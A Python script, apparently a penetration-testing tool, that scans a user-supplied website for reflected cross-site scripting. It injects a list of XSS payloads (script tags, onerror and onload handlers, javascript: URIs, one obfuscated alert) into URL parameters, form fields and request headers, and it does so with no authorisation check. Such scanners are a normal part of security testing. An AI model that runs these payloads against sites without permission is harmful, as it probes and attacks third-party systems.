import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time
import sys

# Common XSS payloads to test
xss_payloads = [
    "<script>alert(1)</script>",                         # Classic script tag
    "<img src=x onerror=alert(1)>",                      # Image tag with onerror
    "'\"><svg onload=alert(1)>",                         # Tag break + SVG
    "<body onload=alert(1)>",                            # Body onload
    "<iframe src=javascript:alert(1)>",                  # iframe-based XSS
    "<input onfocus=alert(1) autofocus>",                # Input focus XSS
    "<video><source onerror=alert(1)></video>",          # Video + source error
    "<a href='javascript:alert(1)'>Click</a>",           # href JS XSS
    "<details open ontoggle=alert(1)>",                  # HTML5 details tag
    "<math><mi//xlink:href='javascript:alert(1)'>",      # SVG/MathML XSS
    "<img src='x' onerror=prompt(1)>",                   # prompt() instead of alert
    "<script>confirm(1)</script>",                       # confirm() instead of alert
    "';alert(String.fromCharCode(88,83,83))//",          # Obfuscated JS
    "<svg><script>top.alert(1)</script></svg>"           # Nested SVG + script
]

def check_dependencies():
    """Check if required packages are available"""
    try:
        import requests
        import bs4
        print("[✓] All required packages are available")
        return True
    except ImportError as e:
        print(f"[!] Missing dependency: {e}")
        print("[*] Run: pip install requests beautifulsoup4 lxml")
        return False

def validate_url(url):
    """Basic URL validation"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc]), url
    except:
        return False, url

def test_url_xss(url):
    """Test URL parameters for XSS - tests all payloads without breaking"""
    print(f"\n[+] Testing URL parameters: {url}")
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    if not query:
        print("[-] No query parameters found to test.")
        return

    # Loop through each parameter in the URL
    for param in query:
        print(f"[~] Testing parameter: {param}")
        vulnerabilities_found = []  # Collect all vulnerabilities found

        for payload in xss_payloads:
            test_params = query.copy()
            test_params[param] = [payload]  # keep it as list like original

            # Build the full URL with proper encoding
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            encoded_params = urlencode({k: v[0] for k, v in test_params.items()})
            test_url = f"{base_url}?{encoded_params}"
            
            try:
                res = requests.get(test_url, timeout=10)

                # Check for reflection
                if payload in res.text and res.status_code == 200:
                    vulnerabilities_found.append({
                        'payload': payload,
                        'url': test_url
                    })

                time.sleep(0.3)  # Consistent rate limiting

            except requests.RequestException as e:
                print(f"[!] Network error testing {test_url}: {e}")
            except Exception as e:
                print(f"[!] Unexpected error: {e}")

        # Report all vulnerabilities found for this parameter
        if vulnerabilities_found:
            print(f"[!] XSS vulnerabilities found in parameter '{param}':")
            for vuln in vulnerabilities_found:
                print(f"    → Payload: {vuln['payload']}")
                print(f"    → URL: {vuln['url']}")
            print()
        else:
            print(f"[-] No XSS vulnerabilities found in parameter: {param}")

def scan_forms_for_xss(url):
    """Scan forms for XSS vulnerabilities - tests all payloads without breaking"""
    print(f"\n[+] Scanning forms at: {url}")
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "lxml")
        forms = soup.find_all("form")

        if not forms:
            print("[-] No forms found.")
            return

        for i, form in enumerate(forms, 1):
            action = form.get("action", "")
            method = form.get("method", "get").lower()
            full_url = urljoin(url, action) if action else url

            inputs = form.find_all("input")
            textareas = form.find_all("textarea")
            selects = form.find_all("select")

            print(f"\n[>] Testing form #{i} — action: '{action}' | method: {method.upper()} | inputs: {len(inputs)}")

            vulnerabilities_found = []  # Collect all vulnerabilities for this form
            valid_input_types = ["text", "search", "email", "url", "tel", "number", "password", ""]

            for payload in xss_payloads:
                form_data = {}
                field_map = {}  # field name → payload (to check reflection)

                # Input fields
                for input_field in inputs:
                    name = input_field.get("name")
                    input_type = input_field.get("type", "").lower()
                    if name and input_type in valid_input_types:
                        form_data[name] = payload
                        field_map[name] = payload

                # Textareas
                for textarea in textareas:
                    name = textarea.get("name")
                    if name:
                        form_data[name] = payload
                        field_map[name] = payload

                # Selects
                for select in selects:
                    name = select.get("name")
                    if name:
                        form_data[name] = payload
                        field_map[name] = payload
                
                if not form_data:
                    continue

                try:
                    if method == "post":
                        res = requests.post(full_url, data=form_data, timeout=10)
                    else:
                        res = requests.get(full_url, params=form_data, timeout=10)

                    # Check all fields for reflection
                    for field, value in field_map.items():
                        if value in res.text:
                            vulnerabilities_found.append({
                                'field': field,
                                'payload': value,
                                'url': full_url,
                                'response': res.text
                            })

                    time.sleep(0.3)  # Consistent rate limiting

                except requests.RequestException as e:
                    print(f"[!] Network error submitting form #{i} with payload {payload}: {e}")
                except Exception as e:
                    print(f"[!] Unexpected error: {e}")

            # Report all vulnerabilities found for this form
            if vulnerabilities_found:
                print(f"[!] XSS vulnerabilities found in form #{i}:")
                for vuln in vulnerabilities_found:
                    print(f"    → Field: {vuln['field']}")
                    print(f"    → Payload: {vuln['payload']}")
                    print(f"    → URL: {vuln['url']}")
                    
                    # Show snippet from response
                    index = vuln['response'].find(vuln['payload'])
                    snippet = vuln['response'][max(0, index - 40): index + len(vuln['payload']) + 40]
                    print(f"    → Response snippet: ...{snippet}...")
                    print()
            else:
                print(f"[-] No XSS vulnerabilities found in form #{i}")

    except requests.RequestException as e:
        print(f"[!] Network error scanning forms: {e}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

def test_headers_for_xss(url):
    """Test HTTP headers for XSS - tests all payloads without breaking"""
    print(f"\n[+] Testing HTTP headers for XSS at: {url}")
    
    headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For"]
    vulnerabilities_found = []  # Collect all header vulnerabilities

    for header_name in headers_to_test:
        print(f"[~] Testing {header_name} header...")
        
        for payload in xss_payloads:
            headers = {header_name: payload}  # Test one header at a time

            try:
                res = requests.get(url, headers=headers, timeout=10)

                if payload in res.text:
                    vulnerabilities_found.append({
                        'header': header_name,
                        'payload': payload
                    })
                
                time.sleep(0.3)  # Consistent rate limiting
                
            except requests.RequestException as e:
                print(f"[!] Network error testing {header_name} header: {e}")
            except Exception as e:
                print(f"[!] Unexpected error: {e}")

    # Report all header vulnerabilities found
    if vulnerabilities_found:
        print(f"[!] Potential XSS vulnerabilities found in headers:")
        for vuln in vulnerabilities_found:
            print(f"    → Header: {vuln['header']}")
            print(f"    → Payload: {vuln['payload']}")
            print(f"    → ⚠️  Manual verification required - may be error page reflection")
        print()
    else:
        print("[-] No XSS found in headers.")

def test_cookie_exposure_via_xss(url):
    """Test for cookie exposure via XSS - removed due to high false positive risk"""
    print(f"\n[+] Cookie exposure testing skipped")
    print("[*] Reason: High false positive rate - most sites will reflect 'document.cookie' in error messages")
    print("[*] Recommendation: Test for regular XSS first, then manually verify cookie access")

def main():
    """Main function with improved error handling"""
    print("🔍 XSS Vulnerability Scanner")
    print("=" * 40)

    # Check dependencies
    if not check_dependencies():
        sys.exit(1)

    target_url = input("Enter the target URL (with http:// or https://): ").strip()
    
    if not target_url:
        print("[!] No URL provided.")
        sys.exit(1)
    
    # Validate URL
    is_valid, target_url = validate_url(target_url)
    if not is_valid:
        print("[!] Invalid URL format.")
        sys.exit(1)

    print(f"\n🎯 Target: {target_url}")

    try:
        # Test connection first
        test_response = requests.get(target_url, timeout=10)
        print(f"[✓] Connection successful (Status: {test_response.status_code})")
        
        # Run tests - all payloads tested, no breaking on first find
        test_url_xss(target_url)
        scan_forms_for_xss(target_url)
        test_headers_for_xss(target_url)
        test_cookie_exposure_via_xss(target_url)
        
        print("\n✅ Scan completed!")
        print("[*] Note: All payloads were tested for comprehensive coverage")

    except requests.RequestException as e:
        print(f"[!] Cannot connect to target: {e}")
        sys.exit(1)
        
if __name__ == "__main__":
    main()